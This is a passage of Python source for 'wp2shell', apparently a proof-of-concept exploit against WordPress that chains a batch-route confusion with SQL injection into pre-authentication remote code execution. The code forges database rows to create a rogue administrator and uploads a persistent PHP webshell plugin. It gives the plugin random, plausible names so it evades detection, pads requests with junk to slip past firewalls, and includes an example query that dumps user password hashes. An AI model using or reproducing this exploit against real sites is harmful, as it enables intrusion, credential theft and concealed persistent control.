    def _union_batch(self, query, timeout=60):
        """Deliver a UNION injection via the route confusion, honoring delivery."""
        inner = [
            {"method": "GET", "path": self.PRIMER},
            {"method": "GET", "path": "/wp/v2/widgets?" + urllib.parse.urlencode(
                {"author_exclude": query, "per_page": 500, "page": 1,
                 "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        return self._send_envelope({"requests": [
            {"method": "POST", "path": self.PRIMER},
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": inner}},
            {"method": "POST", "path": "/batch/v1"},
        ]}, timeout=timeout)

    @staticmethod
    def _walk_strings(obj):
        """Yield every string value in a nested dict/list (batch response body)."""
        if isinstance(obj, dict):
            for v in obj.values():
                yield from Target._walk_strings(v)
        elif isinstance(obj, list):
            for v in obj:
                yield from Target._walk_strings(v)
        elif isinstance(obj, str):
            yield obj

    def _union_read(self, expr):
        """Extract one scalar via UNION reflection. Returns the string, or None if the
        marker never came back (reflection blocked / not vulnerable)."""
        self._normalize_base()
        tok = secrets.token_hex(5)
        mark = "0x" + tok.encode().hex()          # marker as a hex literal for SQL
        content = "CONCAT(%s,IFNULL((%s),0x2d),%s)" % (mark, expr, mark)
        # leading junk-integer pad (WAF signature bypass) as the IN() operand, like the
        # blind oracle payloads -- keeps the injection consistent across all modes.
        query = "%s) AND 1=0 UNION ALL SELECT %s-- -" % (self._pad(), self._union_row(content))
        raw = self._union_batch(query)
        pat = re.compile(re.escape(tok) + r"(.*?)" + re.escape(tok), re.S)
        # Parse the batch JSON and walk it, so string escapes (\/ , \uXXXX) are decoded
        # by the parser; fall back to a raw-text scan if the body isn't clean JSON.
        try:
            haystacks = self._walk_strings(json.loads(raw))
        except ValueError:
            haystacks = [raw.decode("utf-8", "replace")]
        for s in haystacks:
            m = pat.search(s)
            if m:
                inner = re.sub(r"<[^>]+>", "", m.group(1))  # strip wpautop wrapping...
                return html_mod.unescape(inner).strip()      # ...then decode HTML entities
        return None

    def read_union(self, expr):
        """Public single-request UNION read (returns '' if nothing reflected)."""
        v = self._union_read(expr)
        return v if v is not None else ""

    # -- RCE: row forgery + oEmbed → changeset → re-entry → admin creation ----
    # Chain researched by Mustafa Can İPEKÇİ (nukedx),
    # building on the route confusion + SQLi by Adam Kues (Assetnote).

    PRIMER = "http://:"
    EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

    def _send_envelope(self, envelope, timeout=None):
        """POST a batch <envelope> honoring the selected delivery. Under multipart the
        whole nested batch rides as a rest_route form on POST / (same shape _send uses),
        so the RCE forge/extraction requests go over the wire identically to detection —
        instead of always falling back to a JSON batch POST."""
        if self.multipart:
            fields = [("rest_route", "/batch/v1"), ("validation", "normal")]
            fields += self._flatten_fields(envelope)
            if self.bypass:
                fields = self._pump_multipart_fields(fields)
            ctype, body = self._multipart_encode(fields)
            ep = self._mp_ep or (self.base + "/")
            hdrs = {"Content-Type": ctype}
        elif self.bypass:
            # request pumping technique: junk-padded JSON body to /?rest_route=/batch/v1
            pumped = self._pump_envelope(envelope)
            body = json.dumps(pumped).encode()
            ep = self.base + "/?rest_route=/batch/v1"
            hdrs = {"Content-Type": "application/json"}
        else:
            ep = self.batch or self._endpoints()[0]
            body = json.dumps(envelope).encode()
            hdrs = {"Content-Type": "application/json"}
        # When bypass is active, use http.client for precise header control
        if self.cookies or self.bypass:
            _, _, resp_body, _ = self._lowlevel(
                ep, data=body, headers=hdrs, method="POST",
                timeout=timeout or self.timeout)
            return resp_body
        req = urllib.request.Request(ep, data=body, headers=hdrs, method="POST")
        try:
            with self.opener.open(req, timeout=timeout or self.timeout) as resp:
                return resp.read()
        except urllib.error.HTTPError as e:
            return e.read()

    def _rce_send(self, inner_requests, timeout=None):
        return self._send_envelope({"requests": [
            {"method": "POST", "path": self.PRIMER},
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]}, timeout=timeout)

    @staticmethod
    def _hex(value):
        return "0x%s" % value.encode().hex() if value else "''"

    def _post_row(self, post_id, content, title, status, name, parent, post_type):
        h = self._hex
        return ",".join((
            str(post_id), "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            h(content), h(title), "''",
            h(status), h("closed"), h("closed"), "''",
            h(name), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            str(parent), "''", "0",
            h(post_type), "''", "0",
        ))

    def _forge(self, rows, extra_requests=()):
        query = ("%s) AND 1=0 UNION ALL SELECT " % self._pad()
                 + " UNION ALL SELECT ".join(rows) + " -- -")
        self._rce_send([
            {"method": "GET", "path": self.PRIMER},
            {"method": "GET", "path": "/wp/v2/widgets?"
             + urllib.parse.urlencode({"author_exclude": query, "per_page": -1,
                                       "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
            *extra_requests,
        ], timeout=60)

    # -- reuse state: remember a created admin + deployed webshell -------------
    # Repeated `-c` runs against the same target are expensive and noisy (they re-seed
    # oEmbed caches, re-run the blind-SQLi extraction, re-create a user and re-upload a
    # plugin). We persist the admin creds + webshell route/marker per target under
    # ~/.wp2shell/state.json and reuse them, so subsequent commands are a single request
    # to the already-deployed shell. --fresh ignores the cache; --cleanup tears it down.
    STATE_DIR = os.path.expanduser("~/.wp2shell")
    STATE_FILE = os.path.join(STATE_DIR, "state.json")

    @classmethod
    def _load_all_state(cls):
        try:
            with open(cls.STATE_FILE) as fh:
                return json.load(fh)
        except (OSError, ValueError):
            return {}

    def _load_state(self):
        return self._load_all_state().get(self.base, {})

    def _save_state(self, data):
        allst = self._load_all_state()
        allst[self.base] = data
        try:
            os.makedirs(self.STATE_DIR, exist_ok=True)
            tmp = self.STATE_FILE + ".tmp"
            with open(tmp, "w") as fh:
                json.dump(allst, fh, indent=2)
            os.replace(tmp, self.STATE_FILE)
            os.chmod(self.STATE_FILE, 0o600)   # creds on disk -> owner-only
        except OSError as e:
            sys.stderr.write("[!] could not persist reuse state: %s\n" % e)

    def _clear_state(self):
        allst = self._load_all_state()
        if allst.pop(self.base, None) is not None:
            try:
                with open(self.STATE_FILE, "w") as fh:
                    json.dump(allst, fh, indent=2)
            except OSError:
                pass

    # Persistent REST webshell. Unlike a one-shot shell it does NOT unlink on every call,
    # so the deployed plugin can be reused across commands; `rm=1` triggers self-cleanup.
    # The plugin name and REST namespace are randomized per deploy (see _deploy_shell) so
    # there is no fixed "wp2shell/v1" string on the wire for a signature to catch.
    WEBSHELL_PHP = (
        "<?php\n"
        "/* Plugin Name: %s */\n"
        "add_action('rest_api_init', function () {\n"
        "    register_rest_route('%s', '/%s', array(\n"
        "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
        "        'callback' => function ($r) {\n"
        "            if ($r->get_param('rm')) {\n"
        "                require_once ABSPATH.'wp-admin/includes/plugin.php';\n"
        "                deactivate_plugins(plugin_basename(__FILE__), true);\n"
        "                @unlink(__FILE__);\n"
        "                return new WP_REST_Response(array(\n"
        "                    'marker' => '%s', 'output' => '[webshell removed]'));\n"
        "            }\n"
        "            ob_start(); passthru(base64_decode($r->get_param('c')).' 2>&1');\n"
        "            return new WP_REST_Response(array(\n"
        "                'marker' => '%s', 'output' => ob_get_clean()));\n"
        "        },\n"
        "    ));\n"
        "});\n")

    # Plausible plugin-name words so the deployed folder/slug blends with real plugins
    # (e.g. wp-seo-a1b2) instead of a give-away "wp2shell-..." string.
    _PLUGIN_WORDS = ("cache", "seo", "optimizer", "backup", "security", "mailer",
                     "forms", "analytics", "media", "importer", "gallery", "sitemap")

    def _rand_slug(self):
        return "wp-%s-%s" % (secrets.choice(self._PLUGIN_WORDS), secrets.token_hex(4))

    def _rand_namespace(self):
        return "%s%s/v1" % (secrets.choice(self._PLUGIN_WORDS), secrets.token_hex(2))

    def _new_session(self):
        """A fresh cookie-backed opener (own TLS-ignore + proxy config)."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sh = [urllib.request.HTTPSHandler(context=ctx),
              urllib.request.HTTPCookieProcessor(CookieJar()), _KeepPost()]
        if self._proxy:
            sh.append(urllib.request.ProxyHandler(
                {"http": self._proxy, "https": self._proxy}))
        else:
            sh.append(urllib.request.ProxyHandler({}))
        session = urllib.request.build_opener(*sh)
        session.addheaders += self.extra_headers   # same -H headers on authenticated traffic
        return session

    def _login(self, session, username, password):
        """Log <session> in; True if the admin area is reached (creds still valid)."""
        try:
            session.open(urllib.request.Request(
                self.base + "/wp-login.php",
                headers={}), timeout=15).read()
            session.open(urllib.request.Request(
                self.base + "/wp-login.php",
                data=urllib.parse.urlencode({
                    "log": username, "pwd": password, "wp-submit": "Log In",
                    "redirect_to": self.base + "/wp-admin/",
                    "testcookie": "1"}).encode(),
                headers={},
                method="POST"), timeout=30).read()
            with session.open(urllib.request.Request(
                    self.base + "/wp-admin/users.php",
                    headers={}), timeout=30) as resp:
                page = resp.read().decode(errors="replace")
        except urllib.error.URLError:
            return False
        return username in page

    def _deploy_shell(self, session):
        """Upload + activate a persistent webshell plugin.
        Returns (namespace, route, marker, slug) -- all randomized per deploy."""
        slug = self._rand_slug()
        namespace = self._rand_namespace()
        route = secrets.token_hex(12)
        marker = secrets.token_hex(12)
        php = (self.WEBSHELL_PHP % (slug, namespace, route, marker, marker)).encode()

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("%s/%s.php" % (slug, slug), php)

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/plugin-install.php?tab=upload",
                headers={}), timeout=30) as resp:
            page = resp.read().decode(errors="replace")
        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found")

        boundary = "----WebKitFormBoundary%s" % secrets.token_hex(12)
        body = b"".join((
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wpnonce\"\r\n\r\n%s\r\n" % (boundary, nonce.group(1))).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wp_http_referer\"\r\n\r\n"
             "/wp-admin/plugin-install.php?tab=upload\r\n" % boundary).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"pluginzip\"; filename=\"%s.zip\"\r\n"
             "Content-Type: application/zip\r\n\r\n" % (boundary, slug)).encode(),
            buf.getvalue(),
            ("\r\n--%s--\r\n" % boundary).encode(),
        ))
        with session.open(urllib.request.Request(
                self.base + "/wp-admin/update.php?action=upload-plugin",
                data=body,
                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary},
                method="POST"), timeout=60) as resp:
            install_page = resp.read().decode(errors="replace")

        activate = re.search(
            r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install_page)
        if not activate:
            raise RuntimeError("plugin install/activation link not found")
        session.open(urllib.request.Request(
            urllib.parse.urljoin(self.base + "/wp-admin/",
                                html_mod.unescape(activate.group(1))),
            headers={}), timeout=30).read()
        return namespace, route, marker, slug

    def _run_webshell(self, namespace, route, marker, command, rm=False, multipart=None):
        """Invoke the deployed webshell; return its output. In multipart mode the request
        is shaped exactly like the injection batch -- POST / with `rest_route` carried as a
        form field (WP reads it from $_POST in WP::parse_request), NOT as a ?rest_route= GET
        query -- so the shell call is indistinguishable from the rest of the traffic. JSON
        mode keeps rest_route in the URL (a JSON body can't populate the query var).
        rm=True tells the shell to self-delete."""
        mp = self.multipart if multipart is None else multipart
        rest_route = "/%s/%s" % (namespace, route)
        cmd_b64 = base64.b64encode((command or "").encode()).decode()
        if mp:
            fields = [("rest_route", rest_route), ("c", cmd_b64)]
            if rm:
                fields.append(("rm", "1"))
            ctype, body = self._multipart_encode(fields)
            url = self.base + "/"                       # rest_route rides in the body
        else:
            payload = {"c": cmd_b64}
            if rm:
                payload["rm"] = "1"
            ctype, body = "application/json", json.dumps(payload).encode()
            url = self.base + "/?rest_route=" + urllib.parse.quote(rest_route)
        # When bypass is active, use http.client for precise header control
        if self.cookies or self.bypass:
            st, _, resp_body, _ = self._lowlevel(
                url, data=body, headers={"Content-Type": ctype}, method="POST",
                timeout=60)
            result = json.loads(resp_body)
        else:
            req = urllib.request.Request(
                url, data=body,
                headers={"Content-Type": ctype}, method="POST")
            with self.opener.open(req, timeout=60) as resp:
                result = json.loads(resp.read())
        if result.get("marker") != marker:
            raise RuntimeError("webshell did not respond correctly")
        return result["output"]

    def exploit(self, command, fresh=False, cleanup=False):
        """Pre-auth RCE. Reuses a cached admin + deployed webshell for this target when
        one is present and still valid; otherwise runs the full chain and caches the
        result. Returns (username, password, command_output). cleanup=True tears the
        deployed webshell down and forgets the cached state; fresh=True starts over with a
        brand-new administrator and plugin (first removing any previously deployed shell)."""
        self._normalize_base()
        old = self._load_state()

        # -- fresh: tear down the previously deployed shell so we don't stack plugins,
        #    then run the whole chain from scratch (new admin + new plugin) ----------
        if fresh and not cleanup:
            if old.get("route") and old.get("marker"):
                try:
                    self._run_webshell(old.get("namespace") or "wp2shell/v1",
                                       old["route"], old["marker"], "true", rm=True)
                    sys.stderr.write("[*] --fresh: removed previously deployed webshell\n")
                except Exception as e:
                    sys.stderr.write("[!] --fresh: old webshell not removed (%s)\n" % e)
            self._clear_state()

        st = {} if fresh else old
        ns = st.get("namespace") or "wp2shell/v1"   # default for pre-randomization caches
        # Call the shell the way it was deployed, so reuse stays multipart even if the
        # --multipart flag isn't repeated on this run (None -> live self.multipart).
        st_mp = (st.get("delivery") == "multipart") if st.get("delivery") else None

        # -- teardown: have the cached shell remove itself, then forget it ------
        if cleanup:
            if st.get("route") and st.get("marker"):
                try:
                    out = self._run_webshell(ns, st["route"], st["marker"],
                                             command or "true", rm=True, multipart=st_mp)
                finally:
                    self._clear_state()
                return st.get("username"), st.get("password"), out
            self._clear_state()
            raise RuntimeError("no cached webshell to clean up for %s" % self.base)

        # 1. reuse an already-deployed webshell -- one request, no login/upload -
        if st.get("route") and st.get("marker"):
            try:
                out = self._run_webshell(ns, st["route"], st["marker"], command,
                                         multipart=st_mp)
                sys.stderr.write("[+] reusing deployed webshell for %s\n" % self.base)
                return st.get("username"), st.get("password"), out
            except (urllib.error.URLError, RuntimeError, ValueError) as e:
                sys.stderr.write("[!] cached webshell unusable (%s); redeploying\n" % e)

        # 2. reuse cached admin creds if the user still exists; else create one -
        username, password = st.get("username"), st.get("password")
        session = self._new_session()
        if username and password and self._login(session, username, password):
            sys.stderr.write("[+] reusing cached administrator %s\n" % username)
        else:
            username, password = self._create_admin()
            session = self._new_session()
            if not self._login(session, username, password):
                raise RuntimeError("admin login failed (user not created?)")
            sys.stderr.write("[+] administrator created: %s:%s\n" % (username, password))

        # 3. deploy a persistent webshell, run the command, cache for next time -
        sys.stderr.write("[*] deploying webshell, executing command ...\n")
        namespace, route, marker, slug = self._deploy_shell(session)
        out = self._run_webshell(namespace, route, marker, command)
        self._save_state({"username": username, "password": password,
                          "namespace": namespace, "route": route, "marker": marker,
                          "slug": slug, "delivery": self._delivery_name()})
        return username, password, out

    def _create_admin(self):
        """Chain steps 1-4: seed oEmbed caches, extract schema via blind SQLi, forge the
        changeset re-entry, and create an administrator. Returns (username, password)."""
        self._normalize_base()
        # The blind-SQLi reads below need the timing-oracle baseline. detect() sets it;
        # when reached via the reuse fast-path (which skips detection) it's still 0.
        # UNION mode reflects data directly, so it needs no baseline.
        if self._base <= 0 and not self.union:
            self.detect()

        # 1. published post for oEmbed anchor
        try:
            with self.opener.open(
                urllib.request.Request(
                    self.base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
                    headers={}), timeout=15) as resp:
                items = json.loads(resp.read())
        except Exception:
            items = []
        if not items or not items[0].get("link"):
            raise RuntimeError("no published post for oEmbed anchor")

        link = urllib.parse.urlsplit(items[0]["link"])
        token = secrets.token_hex(6)
        embed_urls = [
            urllib.parse.urlunsplit((
                link.scheme, link.netloc, link.path, link.query,
                "%s%d" % (token, i)))
            for i in range(3)]

        # 2. seed 3 oEmbed caches (forged post with [embed] shortcodes → real DB writes)
        sys.stderr.write("[*] seeding oEmbed caches ...\n")
        seed_content = "".join(
            '[embed width="500" height="750"]%s[/embed]' % u for u in embed_urls)
        self._forge([self._post_row(
            0, seed_content, "seed", "publish", "seed", 0, "post")])

        # 3. extract table prefix, admin ID, seeded cache post IDs
        sys.stderr.write("[*] extracting table prefix ...\n")
        posts_table = self.read_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1", 64)
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError("could not resolve posts table (%r)" % posts_table)
        prefix = posts_table[:-5]
        sys.stderr.write("[+] table prefix: %s\n" % (prefix or "(empty)"))

        sys.stderr.write("[*] extracting admin user ID ...\n")
        admin_id = self.read_int(
            "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
            "ON m.user_id=u.ID WHERE m.meta_key=%s "
            "AND INSTR(m.meta_value,%s)>0 "
            "ORDER BY u.ID LIMIT 1" % (
                prefix, prefix,
                self._hex(prefix + "capabilities"),
                self._hex('s:13:"administrator";b:1;')))
        if admin_id < 1:
            raise RuntimeError("could not locate an administrator")
        sys.stderr.write("[+] admin ID: %d\n" % admin_id)

        sys.stderr.write("[*] recovering oEmbed cache post IDs ...\n")
        cache_ids = []
        for u in embed_urls:
            key = hashlib.md5((u + self.EMBED_ATTR).encode()).hexdigest()
            pid = self.read_int(
                "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
                "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
                    posts_table, key.encode().hex()))
            if pid < 1:
                raise RuntimeError("oEmbed cache seeding failed")
            cache_ids.append(pid)
        if len(set(cache_ids)) != 3:
            raise RuntimeError("oEmbed cache IDs not distinct")
        sys.stderr.write("[+] cache IDs: %s\n" % cache_ids)

        # 4. forge changeset elevation + re-entrant parse_request, create admin
        username = "w2s_%s" % token
        password = "W2s!%s" % secrets.token_urlsafe(15)
        email = "%s@wp2shell.local" % username
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner_id = outer + 1, outer + 2

        changeset = json.dumps({
            "nav_menu_item[%d]" % nav_id: {
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0,
                    "position": 0, "type": "custom", "title": "proof",
                    "url": "https://github.com/dinosn/wp2shell-lab",
                    "target": "", "attr_title": "", "description": "proof",
                    "classes": "", "xfn": "", "status": "publish",
                    "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item", "user_id": admin_id,
            }
        }, separators=(",", ":"))

        poisoned = (
            self._post_row(0,
                '[embed width="500" height="750"]%s[/embed]' % embed_urls[1],
                "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future",
                str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft",
                "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish",
                "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish",
                "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse",
                "parse", inner_id, "request"),
            self._post_row(inner_id, "inner", "inner", "draft",
                "inner", cache_ids[2], "post"),
        )
        new_admin = {"username": username, "email": email,
                     "password": password, "roles": ["administrator"]}

        sys.stderr.write("[*] forging changeset + re-entry, creating administrator ...\n")
        self._forge(poisoned, extra_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ])
        return username, password


# -- version fingerprint (best-effort, read-only) --------------------------

# Full chain = batch-route confusion (CVE-2026-63030) + SQLi. Only these ranges are
# actively testable: the confusion is what bypasses input sanitization to reach the sink.
FULL_CHAIN = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1))]
# SQLi sink alone (CVE-2026-60137). The version is affected, but the confusion delivery
# does NOT exist here, so there is no unauth active check on this branch (fixed 6.8.6).
SINK_ONLY = [((6, 8, 0), (6, 8, 5))]


def _ver_tuple(s):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)) if m else None


def fingerprint_version(t):
    # Cache-bust every read: a CDN (Cloudflare/Akamai) in front of WordPress caches the HTML
    # homepage, so a plain fetch can return a STALE generator meta from before an auto-update —
    # which misfingerprints a patched site as an affected version. A unique query param + no-cache
    # headers force an origin MISS. Core-asset ?ver= (block-library/emoji/wp-embed) is the most
    # reliable signal since it is stamped with the running WP version at build time.
    cb = "wpcb%s" % secrets.token_hex(4)
    nocache = {"Cache-Control": "no-cache", "Pragma": "no-cache"}
    core_asset = (r'(?:block-library/style(?:\.min)?\.css|wp-emoji-release(?:\.min)?\.js'
                  r'|wp-embed(?:\.min)?\.js)\?ver=([0-9]+\.[0-9]+(?:\.[0-9]+)?)')
    for path, pat in (("/", core_asset),
                      ("/", r'content="WordPress\s+([0-9.]+)"'),
                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)"),
                      ("/readme.html", r"Version\s+([0-9.]+)")):
        url = t.base + path + ("&" if "?" in path else "?") + cb
        try:
            _, _, body, _ = t._raw(url, headers=nocache)
            m = re.search(pat, body.decode("utf-8", "replace"))
            if m:
                return m.group(1)
        except Exception:
            pass
    return None


def version_verdict(ver):
    vt = _ver_tuple(ver) if ver else None
    if not vt:
        return "unknown"
    if any(lo <= vt <= hi for lo, hi in FULL_CHAIN):
        return "affected-full-chain"
    if any(lo <= vt <= hi for lo, hi in SINK_ONLY):
        return "affected-sqli-sink-only"
    return "outside-affected-range"


# -- driver ----------------------------------------------------------------
def is_local(base):
    host = urllib.parse.urlparse(base).hostname or ""
    return host in ("localhost", "127.0.0.1", "::1", "[::1]")


def scan_one(url, args):
    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep,
               route=args.route, delivery=args.delivery,
               headers=getattr(args, "parsed_headers", []),
               cookies=args.cookies, bypass=args.bypass)
    rec = {"target": url}
    # automatic method (union -> boolean -> time) + delivery selection (see detect_auto)
    try:
        res = t.detect_auto(method=args.method, rounds=args.rounds)
    except urllib.error.URLError as e:
        rec.update(status="error", error=str(e.reason))
        return rec, 2
    active = res["vulnerable"]
    rec["delivery"] = res.get("delivery")
    if active:
        rec["method"] = res["method"]
        if res["method"] == "boolean":
            boo = res["boolean"]
            rec["bool_signal"] = boo["signal"]
            rec["bool_true_rows"] = boo["true_total"] if boo["true_total"] is not None else boo["true_posts"]
            rec["bool_false_rows"] = boo["false_total"] if boo["false_total"] is not None else boo["false_posts"]
    # surface time evidence whenever the SLEEP oracle actually ran (confirm or negative)
    det = res.get("time")
    if isinstance(det, dict) and "fast" in det:
        rec["fast_s"] = round(det["fast"], 3)
        rec["slow_s"] = round(det["slow"], 3)
        rec["delta_s"] = round(det["delta"], 3)
    ver = fingerprint_version(t)
    rec["wp_version"] = ver
    rec["version_verdict"] = version_verdict(ver)
    vv = rec["version_verdict"]
    rec["active_check"] = "fired" if active else "negative"
    if active:
        rec["status"] = "vulnerable"                     # actively confirmed via the injection
    elif vv in ("affected-full-chain", "affected-sqli-sink-only"):
        rec["status"] = "affected_version"               # version affected; active probe didn't confirm
        if vv == "affected-sqli-sink-only":
            rec["note"] = ("version affected by the author__not_in SQLi (CVE-2026-60137, fixed 6.8.6); "
                           "the batch-route confusion that delivers it unauthenticated is 6.9.0+, so "
                           "there is no unauth active check on the 6.8.x branch")
        else:
            rec["note"] = ("version in the full-chain range but the active injection did not fire "
                           "(a WAF/edge may be blocking the batch payload, or the probe was throttled) "
                           "-- treat as affected and patch")
    else:
        rec["status"] = "not_vulnerable"
    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
    if active and args.proof:
        # read_scalar uses the time-based oracle (unless union is set); establish a
        # latency baseline if a blind method confirmed without running the timing probe.
        if t._base <= 0 and not t.union:
            try:
                t.detect(rounds=args.rounds)
            except urllib.error.URLError:
                pass
        try:
            rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
                            "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
        except Exception as e:
            rec["proof_error"] = str(e)
    return rec, code


def human(rec):
    tag = {"vulnerable": "VULNERABLE", "affected_version": "AFFECTED (version)",
           "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
    line = "[%s] %s" % (tag, rec["target"])
    if rec.get("wp_version"):
        line += "  (WordPress %s, %s)" % (rec["wp_version"], rec["version_verdict"])
    if rec["status"] == "error":
        line += "  -- %s" % rec.get("error")
    else:
        bits = []
        if rec.get("method") == "union":
            bits.append("method=union (data reflected)")
        if rec.get("method") == "boolean":
            bits.append("method=boolean rows(true/false)=%s/%s via %s" % (
                rec.get("bool_true_rows"), rec.get("bool_false_rows"), rec.get("bool_signal")))
        if "delta_s" in rec:
            bits.append("method=time fast=%.2fs slow=%.2fs delta=%.2fs" % (
                rec["fast_s"], rec["slow_s"], rec["delta_s"]))
        if rec.get("delivery"):
            bits.append("delivery=%s" % rec["delivery"])
        if bits:
            line += "  [active=%s | %s]" % (rec.get("active_check", "?"), " | ".join(bits))
    out = [line]
    if rec.get("note"):
        out.append("        note: " + rec["note"])
    if rec.get("proof"):
        for k, v in rec["proof"].items():
            out.append("        proof  %-16s = %s" % (k, v))
    return "\n".join(out)


def main():
    p = argparse.ArgumentParser(
        description="wp2shell (CVE-2026-63030/60137) detector & pre-auth RCE PoC.")
    p.add_argument("url", nargs="?", help="target base URL, e.g. http://host:8093")
    p.add_argument("-c", "--command", metavar="CMD",
                   help="OS command to execute via pre-auth RCE (requires --authorized for remote)")
    p.add_argument("-f", "--file", help="file with one target URL per line (# comments ok)")
    p.add_argument("--proof", action="store_true",
                   help="read @@version + current_user() as evidence (read-only)")
    p.add_argument("--sql", metavar="QUERY",
                   help="execute a SQL query via the UNION sink and print the result "
                        "(read-only, single request). The query must return a single "
                        "scalar — use GROUP_CONCAT / LIMIT 1 for multi-row. "
                        "e.g. --sql \"SELECT GROUP_CONCAT(CONCAT(user_login,0x3a,user_pass) "
                        "SEPARATOR 0x0a) FROM wp_users\"")
    p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
    p.add_argument("--method", choices=("auto", "boolean", "time", "union"), default="auto",
                   help="extraction/oracle method. auto (default) tries the fast boolean row-count "
                        "differential first and falls back to the time-based SLEEP oracle; "
                        "boolean/time force a blind oracle; union reflects data directly via a "
                        "UNION SELECT (one request per value -- far faster, needs the response body).")
    p.add_argument("--delivery", choices=("auto", "json", "multipart"), default="auto",
                   help="batch delivery. auto (default) uses a JSON POST to the batch route and "
                        "falls back to a rest_route=/batch/v1 multipart form on POST / if the JSON "
                        "batch isn't processed (e.g. an edge blocks /wp-json). json/multipart force one.")
    p.add_argument("--multipart", action="store_true",
                   help="alias for --delivery multipart (the exact operator request shape)")
    p.add_argument("--fresh", action="store_true",
                   help="start over: remove any previously deployed shell, then run the full "
                        "chain with a brand-new administrator and a brand-new plugin")
    p.add_argument("--cleanup", action="store_true",
                   help="tell the cached webshell to delete itself and forget the saved state")
    p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
    p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("--cookies", default="",
                   help="cookies string sent on every request via http.client "
                        "(e.g. 'cf_clearance=...; __cf_bm=...; pll_language=en'). "
                        "When set (or with --bypass), requests use http.client "
                        "with junk-padded bodies (request pumping technique).")
    p.add_argument("--bypass", action="store_true",
                   help="Enable request pumping: route all requests "
                        "through http.client and wrap the batch in a ~2MB junk-padded "
                        "JSON body (1MB frontpad + random junk keys + nested junk + "
                        "trailing junk) so the WAF never inspects the real requests "
                        "array. No headers are sent automatically — supply UA and "
                        "any fingerprint headers via -H. Combine with --multipart for "
                        "junk-padded multipart bodies, or --cookies for CF clearance.")
    p.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
                   help="extra header added to every request (repeatable), e.g. "
                        "-H 'Cookie: a=b' -H 'X-Forwarded-For: 127.0.0.1'")
    p.add_argument("-t", "--threads", type=int, default=10,
                   help="concurrent workers for -f scans (default 10)")
    p.add_argument("--authorized", action="store_true",
                   help="assert authorization for remote targets")
    p.add_argument("--json", action="store_true", help="emit JSON")
    args = p.parse_args()
    if args.multipart:
        args.delivery = "multipart"
    # parse -H "Name: Value" pairs once; reused for every Target
    hdrs = []
    for h in args.header:
        if ":" not in h:
            p.error("bad header %r (expected 'Name: Value')" % h)
        name, value = h.split(":", 1)
        hdrs.append((name.strip(), value.strip()))
    args.parsed_headers = hdrs   # consumed by scan_one() for -f targets

    # -- RCE mode (-c COMMAND / --cleanup) ------------------------------------
    if args.command or args.cleanup:
        if not args.url:
            p.error("-c/--cleanup require a target URL")
        url = args.url if "://" in args.url else "http://" + args.url
        if not is_local(url) and not args.authorized:
            p.error("-c/--cleanup on remote targets requires --authorized")
        # Honor the selected delivery for the RCE forge/extraction too, so with
        # --multipart the batch requests ride as rest_route forms (not JSON). auto has
        # no resolver on this path, so it defaults to JSON.
        delivery = "json" if args.delivery == "auto" else args.delivery
        t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
                   sleep=args.sleep, route=args.route, delivery=delivery, headers=hdrs,
